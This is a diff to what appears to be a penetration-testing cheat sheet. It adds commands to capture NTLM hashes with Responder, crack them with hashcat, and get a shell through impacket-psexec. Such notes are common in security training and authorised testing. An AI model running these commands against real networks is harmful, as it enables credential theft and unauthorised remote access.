@@ -1762,6 +1762,9 @@ hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule
 
 # crack hash (with salt : append salt after hash in file : hash_here:salt_here)
 hashcat -m hash_format_code_here /path/to/hash /path/to/wordlist
+
+# crack NTLM hash captured with responder
+hashcat -m 5600 /path/to/hash /path/to/wordlist
 ```
 
 
@@ -1902,6 +1905,7 @@ hydra -L users.txt -P passwords.txt rdp://IP_here -t 1
 
 # get shell as user
 /path/to/impacket/psexec.py domain/user@IP_here
+impacket-psexec username_here:password_here@IP_here
 
 # create public share for file transfer Win <--> Lin
 ## setup share on Lin
@@ -3618,6 +3622,20 @@ EnableLUA REG_DWORD 0x1
 ConsentPromptBehaviorAdmin REG_DWORD 0x5
 ## 0 = don't prompt, 1 = prompt
 PromptOnSecureDesktop REG_DWORD 0x1
+```
+
+
+
+## RESPONDER
+```bash
+start responder in analyze mode (capture hashes)
+responder -I interface_here -A
+
+# crack NTLM hash captured with responder
+hashcat -m 5600 /path/to/hash /path/to/wordlist
+
+# spawn shell with psexec
+impacket-psexec username_here:password_here@IP_here
 ```
 
 
